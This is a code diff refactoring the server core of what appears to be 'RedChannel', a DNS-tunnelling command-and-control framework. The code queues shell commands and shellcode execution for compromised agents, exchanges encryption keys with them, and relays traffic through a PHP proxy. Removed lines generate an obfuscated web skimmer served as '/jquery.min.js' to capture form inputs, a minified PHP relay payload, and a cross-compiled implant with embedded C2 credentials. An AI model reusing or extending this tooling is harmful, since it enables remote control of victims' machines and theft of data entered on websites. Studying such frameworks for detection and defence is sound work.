@@ -1,17 +1,19 @@
 import * as fs from "fs";
-import * as jsObfuscator from "javascript-obfuscator";
 import axios from "axios";
 import * as crypto from "crypto";
-import * as os from "os";
 import * as path from "path";
 import merge from "lodash.merge";
 import ECKey from "ec-key";
-import { spawn, ChildProcessWithoutNullStreams } from "child_process";
 
 import { Config, Constants, emsg } from "../utils/utils";
-import Crypto, { CipherModel } from "./crypto";
+import Crypto, { CipherModel, KeyExportType } from "./crypto";
 import Logger from "./logger";
-import Helper from "./helper";
+import SkimmerModule from "../modules/skimmer";
+import StaticDnsModule from "../modules/static_dns";
+import ImplantModule from "../modules/implant";
+import AgentModule from "../modules/agent";
+import ProxyModule from "../modules/proxy";
+import C2Module from "../modules/c2";
 
 export enum AgentCommand {
     AGENT_SYSINFO = 0x01,
@@ -61,24 +63,28 @@ export type ImplantConfig = {
 
 export type RedChannelConfig = {
     c2: C2Config;
-    skimmer: SkimmerConfig;
-    proxy: ProxyConfig;
-    implant: ImplantConfig;
-    static_dns: { [host: string]: string };
     debug: boolean;
 };
 
+// to clarify the Map()s
+export type DataId = string;
+export type DataChunk = string;
+export type SendQ = SendQItem[];
+export type SendQItem = string[];
+export type AgentId = string;
+export type AgentIdRandId = string;
+
 export interface AgentModel {
     id: string;
-    secret?: Buffer;
+    secret: Buffer;
     keyx?: ECKey;
     lastseen?: number;
     ip?: string;
     channel?: AgentChannel;
-    allow_keyx?: boolean;
-    sendq: Array<string[]>;
-    // each agent command has a map of dataId => {chunks, data}
-    recvq: Map<AgentCommand, Map<string, string[]>>;
+    allowKeyx?: boolean;
+    sendq: SendQ;
+    // each agent command has a map of dataId => chunks[]
+    recvq: Map<AgentCommand, Map<DataId, DataChunk[]>>;
 }
 
 // agent status hex string value to be appended to DNS response
@@ -91,6 +97,8 @@ export enum AgentStatus {
     ERROR_DECRYPTING_MESSAGE = "06",
     ERROR_GENERATING_KEYS = "07",
     ERROR_INVALID_MESSAGE = "08",
+    ERROR_AGENT_UNKNOWN = "09",
+    ERROR_FAILED = "0f",
 }
 
 export enum AgentChannel {
@@ -98,11 +106,11 @@ export enum AgentChannel {
     PROXY = "proxy",
 }
 
-class RedChannel {
+export default class RedChannel {
     version = Constants.VERSION;
 
-    agents: { [agentId: string]: AgentModel };
-    flood: Map<string, NodeJS.Timeout>;
+    agents: Map<AgentId, AgentModel>;
+    flood: Map<AgentIdRandId, NodeJS.Timeout>;
 
     /**
      * available commands for 'help' to display
@@ -124,17 +132,17 @@ class RedChannel {
      */
     modules: any;
 
-    master_password: string;
+    masterPassword: string;
 
     // name of module currently interacting with
-    using_module: string;
+    usingModule: string;
 
-    config_file: string;
+    configFile: string;
 
     config: RedChannelConfig;
 
     // the absolute path to the app directory
-    app_root: string = path.resolve("./");
+    appRoot: string = path.resolve("./");
 
     log: Logger;
 
@@ -143,42 +151,11 @@ class RedChannel {
     constructor(debug: boolean, domain: string, config: any, password: string, configFile?: string) {
         this.log = new Logger();
 
-        this.agents = {};
-        this.commands = { ...Helper.Commands() };
+        this.agents = new Map<AgentId, AgentModel>();
 
-        this.modules = {
-            proxy: {
-                fetch_timer: {}, // stores the loop Timeout ref
-                actions: {
-                    generate: this.proxy_generate,
-                    fetch: this.proxy_fetch,
-                    "set enabled": this.proxy_enable,
-                },
-            },
-            skimmer: {
-                payload: "", // generated, payload to serve via payload_route,
-                actions: {
-                    generate: this.skimmer_generate,
-                },
-            },
-            static_dns: {
-                actions: {
-                    add: this.static_dns_add,
-                    delete: this.static_dns_delete,
-                },
-            },
-            implant: {
-                actions: {
-                    generate: this.implant_build,
-                    build: this.implant_build,
-                    log: this.implant_log,
-                },
-            },
-        };
+        this.usingModule = "";
 
-        this.using_module = "";
-
-        this.config_file = configFile ?? Config.DEFAULT_CONFIG_FILE;
+        this.configFile = configFile ?? Config.DEFAULT_CONFIG_FILE;
 
         // merged with data from config file
         this.config = {
@@ -193,119 +170,112 @@ class RedChannel {
                 binary_route: "/agent",
                 web_url: "",
             },
-            skimmer: {
-                payload_route: "/jquery.min.js",
-                data_route: "/stats",
-                url: "",
-                target_classes: [],
-                target_ids: [],
-            },
-            proxy: {
-                enabled: false,
-                url: "",
-                key: "",
-                interval: 2000,
-            },
-            implant: {
-                os: "windows",
-                arch: "amd64",
-                interval: 5000,
-                resolver: "8.8.8.8:53",
-                output_file: "",
-                debug: false,
-            },
-            static_dns: {},
             debug: debug,
         };
 
         this.config.c2.plaintext_password = password;
-        this.master_password = crypto.createHash("md5").update(password).digest("hex");
+        this.masterPassword = crypto.createHash("md5").update(password).digest("hex");
 
         // read config file and merge with defaults to ensure properties exist
         try {
-            const configData = JSON.parse(fs.readFileSync(this.config_file).toString());
+            const configData = JSON.parse(fs.readFileSync(this.configFile).toString());
             this.config = merge(this.config, merge(configData, config));
         } catch (ex) {
-            throw new Error(`Error reading configuration file '${this.config_file}': ${emsg(ex)}`);
+            throw new Error(`Error reading configuration file '${this.configFile}': ${emsg(ex)}`);
         }
 
         if (!this.config.c2.domain) {
             throw new Error(`Please specify the c2 domain via cli or config file, see '--help'`);
         }
 
-        this.app_root = __dirname;
+        this.appRoot = __dirname;
 
         this.crypto = new Crypto();
 
         this.interact = null;
-        this.flood = new Map<string, NodeJS.Timeout>();
+        this.flood = new Map<AgentId, NodeJS.Timeout>();
 
-        if (this.config.proxy.enabled) {
-            this.log.info(`starting proxy checkin at interval: ${this.config.proxy.interval}ms`);
-            this.proxy_fetch_loop();
-        }
+        this.modules = {
+            agent: new AgentModule(this.configFile),
+            implant: new ImplantModule(this.configFile, this.config, this.modules),
+            proxy: new ProxyModule(this.configFile, this.config.c2.domain, this.c2MessageHandler.bind(this)),
+            c2: new C2Module(this.configFile),
+            skimmer: new SkimmerModule(this.configFile),
+            static_dns: new StaticDnsModule(this.configFile),
+        };
+
+        if (this.modules.proxy.config.enabled) this.modules.proxy.proxyFetchLoop();
     }
 
-    init_agent(agent_id, channel: AgentChannel) {
-        if (typeof this.agents[agent_id] == "undefined") {
-            this.agents[agent_id] = {
-                id: agent_id,
+    initAgent(agentId, channel: AgentChannel) {
+        if (!this.agents.has(agentId)) {
+            this.agents.set(agentId, {
+                id: agentId,
+                secret: Buffer.from(""),
                 lastseen: 0,
                 channel: channel,
-                allow_keyx: false,
+                allowKeyx: false,
                 sendq: [],
-                recvq: new Map<AgentCommand, Map<string, string[]>>(),
-            };
-        }
-    }
-
-    kill_agent(agent_id) {
-        delete this.agents[agent_id];
-    }
-
-    command_keyx(agent_id?: string) {
-        if (!this.crypto.privateKey) {
-            this.crypto.generate_keys();
-        }
-
-        const uncompressedPublicKey = this.crypto.export_pubkey("uncompressed");
-        if (!agent_id) {
-            // broadcast keyx if no agent is specified
-            Object.keys(this.agents).forEach((id) => {
-                this.queue_data(id, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
+                recvq: new Map<AgentCommand, Map<DataId, DataChunk[]>>(),
             });
+        }
+    }
+
+    killAgent(agentId) {
+        this.agents.delete(agentId);
+    }
+
+    sendCommandKeyx(agentId?: string) {
+        if (!this.crypto.privateKey) {
+            try {
+                this.crypto.generateKeys();
+            } catch (ex) {
+                this.log.error(`failed to generate keys: ${emsg(ex)}`);
+                return;
+            }
+        }
+
+        const uncompressedPublicKey = this.crypto.exportPublicKey(KeyExportType.UNCOMPRESSED);
+        if (!agentId) {
+            // broadcast keyx if no agent is specified
+            for (const id of this.agents.keys()) {
+                this.queueData(id, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
+            }
+            this.log.info(`broadcasting keyx`);
             return;
         }
 
-        if (typeof this.agents[agent_id] != "undefined") {
-            this.queue_data(agent_id, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
+        if (this.agents.has(agentId)) {
+            this.queueData(agentId, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
+        } else {
+            this.log.error(`agent ${agentId} does not exist`);
         }
         return;
     }
 
-    command_shutdown() {
+    sendCommandShutdown() {
         if (!this.interact) return;
 
-        this.queue_data(this.interact.id, AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6).toString("hex")));
+        this.queueData(this.interact.id, AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6).toString("hex")));
     }
 
-    command_shell(shell_cmd) {
+    sendCommandShell(shell_cmd) {
         if (!this.interact) return;
 
-        this.queue_data(this.interact.id, AgentCommand.AGENT_SHELL, shell_cmd);
+        this.queueData(this.interact.id, AgentCommand.AGENT_SHELL, shell_cmd);
     }
 
-    command_exec_sc(shellcode) {
+    sendCommandExecShellcode(shellcode) {
         if (!this.interact) return;
 
-        this.queue_data(this.interact.id, AgentCommand.AGENT_EXEC_SC, shellcode);
+        this.queueData(this.interact.id, AgentCommand.AGENT_EXEC_SC, shellcode);
     }
 
     // agent must be able to decrypt the tag to execute shutdown
-    command_sysinfo() {
+    sendCommandSysinfo() {
         if (!this.interact) return;
 
-        this.queue_data(this.interact.id, AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6).toString("hex")));
+        this.queueData(this.interact.id, AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6).toString("hex")));
     }
     /**
      * config format:
@@ -313,20 +283,22 @@ class RedChannel {
      * interval=5000
      * c2_domain=domain1[,domain2?]
      */
-    command_set_config(config: string) {
+    sendCommandSetConfig(config: string) {
         if (!this.interact) return;
 
-        this.queue_data(this.interact.id, AgentCommand.AGENT_SET_CONFIG, config);
+        this.queueData(this.interact.id, AgentCommand.AGENT_SET_CONFIG, config);
     }
 
-    encryptPayload(data: string): string {
-        if (!this.interact) return "";
-
-        const buffer = Buffer.from(data);
-        const cipher = this.crypto.aes_encrypt(buffer, this.interact.secret);
-        const payload = this.make_encrypted_buffer_string(cipher);
-        return payload;
+    resetUsingModuleConfig() {
+        let config: any;
+        try {
+            config = JSON.parse(fs.readFileSync(this.configFile).toString());
+        } catch (ex) {
+            throw new Error(`error parsing config file: ${emsg(ex)}`);
+        }
+        this.config[this.usingModule] = config[this.usingModule];
     }
+
     /**
      * queue up data to send when agent checks in next
      * 2001:[record_num]:[4 byte data]:...
@@ -335,8 +307,12 @@ class RedChannel {
      * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
      *
      */
-    queue_data(agentId, command, data) {
-        const agent = this.agents[agentId];
+    queueData(agentId, command, data) {
+        const agent = this.agents.get(agentId);
+        if (!agent) {
+            this.log.error(`agent ${agentId} not found`);
+            return;
+        }
 
         let dataPayload = this.encryptPayload(data);
         if (dataPayload.length == 0) dataPayload = crypto.randomBytes(2).toString("hex");
@@ -365,7 +341,7 @@ class RedChannel {
             // pad the last block with trailing Fs
             const lastAddedBlock = blocksPerIp.slice(-1)[0];
             paddedBytes = 4 - lastAddedBlock.length;
-            blocksPerIp[blocksPerIp.length - 1] = this.pad_tail(lastAddedBlock, 4);
+            blocksPerIp[blocksPerIp.length - 1] = this.padTail(lastAddedBlock, 4);
             if (blocksPerIp.length < Config.MAX_DATA_BLOCKS_PER_IP) {
                 const blocksNeeded = Config.MAX_DATA_BLOCKS_PER_IP - blocksPerIp.length;
                 for (let j = 0; j < blocksNeeded; j++) {
@@ -381,7 +357,7 @@ class RedChannel {
             record =
             Config.RECORD_DATA_PREFIX +
                 ":" +
-                this.pad_zero(recordNum.toString(16), 4) +
+                this.padZero(recordNum.toString(16), 4) +
                 ":" +
                 blocksPerIp.join(":");
             records.push(record);
@@ -393,10 +369,10 @@ class RedChannel {
                     ":" +
                     dataId +
                     ":" +
-                    this.pad_zero(command.toString(16), 2) +
-                    this.pad_zero(paddedBytes.toString(16), 2) +
+                    this.padZero(command.toString(16), 2) +
+                    this.padZero(paddedBytes.toString(16), 2) +
                     ":" +
-                    this.pad_zero(totalRecords.toString(16), 4) +
+                    this.padZero(totalRecords.toString(16), 4) +
                     ":" +
                     "0000:0000:0000:0001";
 
@@ -413,22 +389,22 @@ class RedChannel {
                 ":" +
                 dataId +
                 ":" +
-                this.pad_zero(command.toString(16), 2) +
-                this.pad_zero(paddedBytes.toString(16), 2) +
+                this.padZero(command.toString(16), 2) +
+                this.padZero(paddedBytes.toString(16), 2) +
                 ":" +
-                this.pad_zero(totalRecords.toString(16), 4) +
+                this.padZero(totalRecords.toString(16), 4) +
                 ":" +
                 "0000:0000:0000:0001";
             records.unshift(record);
         }
 
         // set to false after keyx is received and there are no more keyx in sendq
-        if (command == AgentCommand.AGENT_KEYX) agent.allow_keyx = true;
+        if (command == AgentCommand.AGENT_KEYX) agent.allowKeyx = true;
 
         if (records.length > 0) {
             agent.sendq?.push(records);
-            if (this.config.proxy.enabled && agent.channel == AgentChannel.PROXY) {
-                this.send_to_proxy(agent.id, records);
+            if (this.modules.proxy.config.enabled && agent.channel == AgentChannel.PROXY) {
+                this.sendToProxy(agent.id, records);
 
                 // cleanup sendq if proxying to agent
                 agent.sendq = [];
@@ -438,19 +414,19 @@ class RedChannel {
         //console.log("`- records: " + JSON.stringify(records));
     }
 
-    async send_to_proxy(agentId: string, records: string[]) {
+    async sendToProxy(agentId: string, records: string[]) {
         const recordsString = `${records.join(";")};`;
 
         // console.log("* sending data to proxy: " + str_data);
         const data = {
             d: recordsString,
-            k: this.config.proxy.key,
+            k: this.modules.proxy.config.key,
             i: agentId,
             p: "c",
         };
 
         try {
-            const res = await axios.post(this.config.proxy.url, data);
+            const res = await axios.post(this.modules.proxy.config.url, data);
             this.log.debug(`proxy send response: ${res.data}`);
         } catch (ex) {
             this.log.error(`failed to send data to proxy: ${emsg(ex)}`);
@@ -458,27 +434,27 @@ class RedChannel {
         return;
     }
 
-    async get_from_proxy() {
-        if (!this.config.proxy.enabled) return;
-        if (this.config.proxy?.url || this.config.proxy?.key) return;
+    async getFromProxy() {
+        if (!this.modules.proxy.config.enabled) return;
+        if (this.modules.proxy.config?.url || this.modules.proxy.config?.key) return;
 
         const data = {
-            url: this.config.proxy.url,
+            url: this.modules.proxy.config.url,
             form: {
-                k: this.config.proxy.key,
+                k: this.modules.proxy.config.key,
                 f: "a",
             },
         };
 
         return axios
-            .post(this.config.proxy.url, data)
-            .then((result) => this.process_proxy_data(result.data))
+            .post(this.modules.proxy.config.url, data)
+            .then((result) => this.processProxyData(result.data))
             .catch((ex) => {
                 this.log.error(`proxy fetch failed: ${emsg(ex)}`);
             });
     }
 
-    process_proxy_data(proxyData: string) {
+    processProxyData(proxyData: string) {
         // we expect the proxy to respond with ERR 1, or similar
         // this.this.log.debug(`proxy response:\n${proxyData}`);
         if (proxyData.length <= 5) throw new Error(`unexpected response (too small)`);
@@ -489,7 +465,7 @@ class RedChannel {
         data.forEach((q) => {
             let req = {
                 connection: {
-                    remoteAddress: this.config.proxy.url,
+                    remoteAddress: this.modules.proxy.config.url,
                     type: "PROXY",
                 },
             };
@@ -507,20 +483,25 @@ class RedChannel {
         });
     }
 
-    pad_zero(proxyData, max_len) {
+    padZero(proxyData, max_len) {
         return "0".repeat(max_len - proxyData.length) + proxyData;
     }
-    pad_tail(proxyData, max_len) {
+    padTail(proxyData, max_len) {
         return proxyData + Config.DATA_PAD_CHAR.repeat(max_len - proxyData.length);
     }
 
-    is_command_in_sendq(agent_id, command) {
-        var is = false;
-        var cmd = this.pad_zero(command.toString(16), 2);
+    isCommandInSendQ(agentId, command) {
+        const agent = this.agents.get(agentId);
+        if (!agent) {
+            this.log.error(`agent ${agentId} not found`);
+            return;
+        }
 
-        this.agents[agent_id].sendq?.forEach((q) => {
-            if (q[0].substring(0, 4) == Config.RECORD_HEADER_PREFIX) {
-                if (q[0].substring(12, 14) == cmd) {
+        const findCommand = this.padZero(command.toString(16), 2);
+        let is = false;
+        agent.sendq?.forEach((queue) => {
+            if (queue[0].substring(0, 4) == Config.RECORD_HEADER_PREFIX) {
+                if (queue[0].substring(12, 14) == findCommand) {
                     is = true;
                     return;
                 }
@@ -529,7 +510,7 @@ class RedChannel {
         return is;
     }
 
-    make_ip_string(last_byte) {
+    makeIpString(last_byte) {
         return `${Config.RECORD_HEADER_PREFIX}:0000:${AgentCommand.AGENT_IGNORE.toString(16)}01:0000:0000:dead:c0de:00${last_byte}`;
     }
 
@@ -538,11 +519,11 @@ class RedChannel {
      * @param {CipherModel} cipher A cipher object with IV and Data
      * @returns a hex string
      */
-    make_encrypted_buffer_string(cipher: CipherModel) {
+    makeEncryptedBufferStringHex(cipher: CipherModel) {
         return Buffer.concat([cipher.iv, cipher.data]).toString("hex");
     }
 
-    count_data_chunks(chunks_array: string[]) {
+    countDataChunks(chunks_array: string[]) {
         return chunks_array.filter((a) => a !== undefined).length;
     }
 
@@ -550,245 +531,16 @@ class RedChannel {
      * return an array of agent idents with an optional
      * prepended text to each ident (for tab completion)
      */
-    get_all_agents(prepend = "") {
+    getAllAgents(prepend = "") {
         const agents: string[] = [];
-        Object.keys(this.agents).forEach((a) => {
-            agents.push(prepend + this.agents[a].id);
-        });
+        for (const id of this.agents.keys()) {
+            agents.push(prepend + id);
+        }
         return agents;
     }
 
-    get_agent(agentId): AgentModel | null {
-        for (const id in this.agents) {
-            if (id == agentId) return this.agents[id];
-        }
-        return null;
-    }
-
-    /**
-     * skimmer generate action
-     */
-    skimmer_generate() {
-        if (this.config.skimmer.url.length == 0) throw new Error(`skimmer url is required, see 'help'`);
-
-        let data: Buffer;
-        let skimmerJs = "";
-        try {
-            data = fs.readFileSync("payloads/skimmer.js");
-            skimmerJs = data.toString();
-        } catch (ex) {
-            throw new Error(`failed to generate payload: ${emsg(ex)}`);
-        }
-
-        const targetClasses = "['" + this.config.skimmer.target_classes.join("','") + "']";
-        const targetIds = "['" + this.config.skimmer.target_ids.join("','") + "']";
-        const targetUrl = this.config.skimmer.url;
-        const targetDataRoute = this.config.skimmer.data_route;
-
-        skimmerJs = skimmerJs.replace(/\[SKIMMER_URL\]/, targetUrl);
-        skimmerJs = skimmerJs.replace(/\[SKIMMER_DATA_ROUTE\]/, targetDataRoute);
-        skimmerJs = skimmerJs.replace(/\[SKIMMER_CLASSES\]/, targetClasses);
-        skimmerJs = skimmerJs.replace(/\[SKIMMER_IDS\]/, targetIds);
-        skimmerJs = skimmerJs.replace(/\s+console\.log\(.+;/g, "");
-
-        let obfs: jsObfuscator.ObfuscationResult;
-        try {
-            obfs = jsObfuscator.obfuscate(skimmerJs, {
-                compact: true,
-                controlFlowFlattening: true,
-                transformObjectKeys: true,
-                log: false,
-                renameGlobals: true,
-                stringArray: true,
-                stringArrayEncoding: ["rc4"],
-                identifierNamesGenerator: "mangled",
-            });
-            this.modules.skimmer.payload = obfs.getObfuscatedCode();
-        } catch (ex) {
-            throw new Error(`failed to obfuscate js payload: ${emsg(ex)}`);
-        }
-
-        return { message: `skimmer payload set to: \n${this.modules.skimmer.payload}` };
-    }
-
-    /**
-     * proxy generate action
-     */
-    proxy_generate() {
-        if (!this.config.proxy.key) throw new Error(`proxy key is required, see 'help'`);
-
-        let data: Buffer;
-        let proxyPhp = "";
-        try {
-            data = fs.readFileSync("payloads/proxy.php");
-            proxyPhp = data.toString();
-        } catch (ex) {
-            throw new Error(`failed to generate payload: ${emsg(ex)}`);
-        }
-
-        proxyPhp = proxyPhp.replace(/\[PROXY_KEY\]/, this.config.proxy.key);
-        proxyPhp = proxyPhp.replace(/\/\/.+/g, "");
-        proxyPhp = proxyPhp.replace(/<\?php/g, "");
-        proxyPhp = proxyPhp.replace(/\?>/g, "");
-        proxyPhp = proxyPhp.replace(/\n/g, "");
-        proxyPhp = proxyPhp.replace(/\s{2,}/g, "");
-
-        this.modules.proxy.payload = `<?php ${proxyPhp} ?>`;
-        return { message: `proxy payload set: \n${this.modules.proxy.payload}` };
-    }
-    proxy_fetch() {
-        this.get_from_proxy();
-        return { message: "fetching data from proxy..." };
-    }
-
-    proxy_enable() {
-        let message = this.config.proxy.enabled ? `starting proxy checkin at interval: ${this.config.proxy.interval}ms` : `stopping proxy checkin`;
-
-        this.proxy_fetch_loop();
-        return { message: message, error: false };
-    }
-
-    /**
-     * Proxy loop
-     */
-    proxy_fetch_loop() {
-        if (this.modules.proxy.fetch_timer) clearTimeout(this.modules.proxy.fetch_timer);
-        if (!this.config.proxy.enabled) return;
-
-        this.get_from_proxy().finally(() => {
-            this.modules.proxy.fetch_timer = setTimeout(() => {
-                this.proxy_fetch_loop();
-            }, this.config.proxy.interval);
-        });
-    }
-
-    static_dns_add(params) {
-        if (params.length < 2) throw new Error(`please enter a host and ip, see 'help'"`);
-
-        let host = params[0];
-        let ip = params[1];
-
-        if (!Constants.VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);
-        if (!Constants.VALID_IP_REGEX.test(ip)) throw new Error(`invalid ip value, see 'help'`);
-
-        this.config.static_dns[host] = ip;
-        return { message: `added static dns record ${host} = ${ip}` };
-    }
-
-    static_dns_delete(params) {
-        if (params.length == 0) throw new Error(`please enter a host, see 'help'"`);
-
-        const host = params[0];
-        if (!Constants.VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);
-
-        delete this.config.static_dns[host];
-        return { message: `deleted static dns record ${host}` };
-    }
-
-    implant_build_gen_config() {
-        let data: Buffer;
-        let configData = "";
-        let agentConfigPath = `${this.app_root}/agent/config/config.go`;
-        try {
-            data = fs.readFileSync(`${agentConfigPath}.sample`);
-            configData = data.toString();
-        } catch (ex) {
-            throw new Error(`failed to read agent config file template '${agentConfigPath}.sample': ${emsg(ex)}`);
-        }
-
-        configData = configData.replace(/^\s*c\.C2Domain\s*=\s*\".*\".*$/im, `c.C2Domain = "${this.config.c2.domain}"`);
-        configData = configData.replace(/^\s*c\.C2Password\s*=\s*\".*\".*$/im, `c.C2Password = "${this.config.c2.plaintext_password}"`);
-        configData = configData.replace(/^\s*c\.Resolver\s*=\s*\".*\".*$/im, `c.Resolver = "${this.config.implant.resolver}"`);
-        configData = configData.replace(/^\s*c\.C2Interval\s*=.*$/im, `c.C2Interval = ${this.config.implant.interval}`);
-        configData = configData.replace(/^\s*c\.ProxyEnabled\s*=.*$/im, `c.ProxyEnabled = ${this.config.proxy.enabled}`);
-        configData = configData.replace(/^\s*c\.ProxyUrl\s*=\s*\".*\".*$/im, `c.ProxyUrl = "${this.config.proxy.url}"`);
-        configData = configData.replace(/^\s*c\.ProxyKey\s*=\s*\".*\".*$/im, `c.ProxyKey = "${this.config.proxy.key}"`);
-
-        try {
-            fs.writeFileSync(agentConfigPath, configData, { flag: "w" });
-        } catch (ex) {
-            throw new Error(`failed to write agent config file '${agentConfigPath}': ${emsg(ex)}`);
-        }
-        return { message: `agent config file written to: ${agentConfigPath}` };
-    }
-
-    implant_build(params) {
-        const targetOs = params[0] ?? this.config.implant.os;
-        const targetArch = params[1] ?? this.config.implant.arch;
-        const debug = this.config.implant.debug;
-
-        if (!Constants.VALID_BUILD_TARGET_OS.test(targetOs)) throw new Error(`invalid os value, must be supported by Go (GOOS)`);
-        if (!Constants.VALID_BUILD_TARGET_ARCH.test(targetArch)) throw new Error(`invalid arch value, must be supported by Go (GOARCH)`);
-
-        try {
-            this.implant_build_gen_config();
-        } catch (ex) {
-            throw new Error(`error generating build config: ${emsg(ex)}`);
-        }
-
-        const buildPath = `${this.app_root}/agent`;
-        const outputFile = `${buildPath}/build/agent${targetOs === "windows" ? ".exe" : ""}`;
-
-        // prettier-ignore
-        const commandArguments = [
-            `${buildPath}/tools/build.py`,
-            `${buildPath}`,
-            `${outputFile}`,
-            targetOs,
-            targetArch,
-            debug && "debug",
-        ];
-        const goEnvironment = {
-            GOOS: targetOs,
-            GOARCH: targetArch,
-            GO111MODULE: "auto",
-            GOCACHE: path.join(os.tmpdir(), "rc-build-cache"), // 'go cache clean' after build?
-            GOPATH: path.join(os.tmpdir(), "rc-build-path"),
-            PATH: process.env.PATH,
-        };
-
-        const spawnBinary = "python";
-        let childProcess: ChildProcessWithoutNullStreams;
-        try {
-            // TODO: do this with docker instead? https://hub.docker.com/_/golang
-            childProcess = spawn(spawnBinary, commandArguments, {
-                env: goEnvironment,
-                cwd: buildPath /*, windowsVerbatimArguments: true*/,
-            });
-            childProcess.on("close", (code) => {
-                // send this message to the UI somehow
-                this.log.success(`agent build for os: ${targetOs}, arch: ${targetArch}, debug: ${debug ? "true" : "false"}, return code: ${code}`);
-            });
-        } catch (ex) {
-            return { message: `failed to launch build command: '${emsg(ex)}', build command: '${spawnBinary} ${commandArguments.join(" ")}'`, error: true };
-        }
-
-        try {
-            const logStream = fs.createWriteStream(`${this.app_root}/agent/build/build.log`, { flags: "w" });
-            childProcess.stdout.pipe(logStream);
-            childProcess.stderr.pipe(logStream);
-        } catch (ex) {
-            throw new Error(`failed to write log file: ${emsg(ex)}`);
-        }
-
-        this.config.implant.output_file = outputFile;
-
-        const binaryUrl = this.config.c2.web_url + this.config.c2.binary_route;
-
-        return {
-            message: `building ${debug ? "(debug)" : ""} agent for os: ${targetOs}, arch: ${targetArch}, binary will be available here: ${outputFile} and ${binaryUrl}`,
-        };
-    }
-    implant_log() {
-        var log_path = `${this.app_root}/agent/build/build.log`;
-        var log_data = "";
-        try {
-            log_data = fs.readFileSync(log_path).toString();
-        } catch (ex) {
-            return { message: `error: failed to read build log file: ${emsg(ex)}`, error: true };
-        }
-
-        return { message: log_data, error: false };
+    getAgent(agentId): AgentModel | null {
+        return this.agents.get(agentId) || null;
     }
 
     /**
@@ -813,12 +565,12 @@ class RedChannel {
         var ttl = 300; // Math.floor(Math.random() 3600)
         let channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;
 
-        if (this.config.static_dns[hostname]) {
-            this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${this.config.static_dns[hostname]}'`);
+        if (this.modules.static_dns.config[hostname]) {
+            this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${this.modules.static_dns.config[hostname]}'`);
             res.answer.push({
                 name: hostname,
                 type: "A",
-                data: this.config.static_dns[hostname],
+                data: this.modules.static_dns.config[hostname],
                 ttl: ttl,
             });
             return res.end();
@@ -845,18 +597,20 @@ class RedChannel {
         // used to prevent flooding
         const randId: string = segments[0];
         const agentId: string = segments[1];
-        const floodId = agentId + randId;
-        if (!this.agents[agentId]) {
-            this.init_agent(agentId, channel);
-            this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${this.agents[agentId].channel}`);
 
-            if (!this.crypto.privateKey) this.crypto.generate_keys();
+        const floodId = agentId + randId;
+
+        if (!this.agents.has(agentId)) {
+            this.initAgent(agentId, channel);
+            this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${channel}`);
 
             this.log.warn(`keyx started with agent ${agentId}`);
-            this.command_keyx(agentId);
+            this.sendCommandKeyx(agentId);
         }
-        this.agents[agentId].lastseen = Math.floor(Date.now() / 1000);
-        this.agents[agentId].ip = req.connection.remoteAddress;
+        const agent = this.agents.get(agentId)!;
+
+        agent.lastseen = Math.floor(Date.now() / 1000);
+        agent.ip = req.connection.remoteAddress;
 
         let command = 0;
         try {
@@ -869,15 +623,15 @@ class RedChannel {
 
         // no need to check the incoming data, just send a queued up msg
         if (command == AgentCommand.AGENT_CHECKIN) {
-            if (channel !== this.agents[agentId].channel) {
-                this.log.warn(`agent ${agentId} switching channel from ${this.agents[agentId].channel} to ${channel}`);
-                this.agents[agentId].channel = channel;
+            if (channel !== agent.channel) {
+                this.log.warn(`agent ${agentId} switching channel from ${agent.channel} to ${channel}`);
+                agent.channel = channel;
             }
 
-            if (this.agents[agentId].sendq?.length == 0) {
+            if (agent.sendq?.length == 0) {
                 // 03 means no data to send
                 this.log.debug(`agent ${agentId} checking in, no data to send`);
-                const noDataStatus = this.make_ip_string(AgentStatus.NO_DATA);
+                const noDataStatus = this.makeIpString(AgentStatus.NO_DATA);
                 res.answer.push({
                     name: hostname,
                     type: "AAAA",
@@ -904,7 +658,7 @@ class RedChannel {
             }
 
             this.log.debug(`agent ${agentId} checking in, sending next queued command`);
-            const records = this.agents[agentId].sendq.shift();
+            const records = agent.sendq.shift();
             if (records) {
                 records.forEach((record) => {
                     res.answer.push({
@@ -928,48 +682,60 @@ class RedChannel {
             return res.end();
         }
 
-        let currentChunk = 0;
+        let chunkNumber = 0;
         let totalChunks = 0;
         try {
-            currentChunk = parseInt(segments[2].slice(2, 4), 16);
+            chunkNumber = parseInt(segments[2].slice(2, 4), 16);
             totalChunks = parseInt(segments[2].slice(4, 6), 16);
         } catch (ex) {
-            return this.log.error(`message: invalid chunk numbers, current: ${currentChunk}, total: ${totalChunks}`);
+            this.log.error(`message: invalid chunk numbers, current: ${chunkNumber}, total: ${totalChunks}`);
+            return res.end();
+        }
+
+        if (chunkNumber > totalChunks - 1) {
+            this.log.error(`message: invalid chunk number (out of bounds), current: ${chunkNumber}, total: ${totalChunks}`);
+            return res.end();
         }
 
         const dataId: string = segments[3];
-        if (dataId.length < 2) return this.log.error(`message: invalid data id: ${dataId}`);
+        if (dataId.length < 2) {
+            this.log.error(`message: invalid data id: ${dataId}`);
+            return res.end();
+        }
 
         const chunk: string = segments[4];
-        if (chunk.length < 2) return this.log.error(`message: invalid chunk: ${chunk}`);
+        if (chunk.length < 2) {
+            this.log.error(`message: invalid chunk: ${chunk}`);
+            return res.end();
+        }
 
-        if (!this.agents[agentId].recvq.has(command)) {
-            this.agents[agentId].recvq.set(command, new Map<string, string[]>());
+        if (!agent.recvq.has(command)) {
+            agent.recvq.set(command, new Map<DataId, DataChunk[]>());
         }
 
         // we use ! to tell typescript we are smarter than it
-        const recvqCommand = this.agents[agentId].recvq.get(command)!;
+        const recvqCommand = agent.recvq.get(command)!;
         if (!recvqCommand.get(dataId)) {
             recvqCommand.set(dataId, new Array(totalChunks));
         }
 
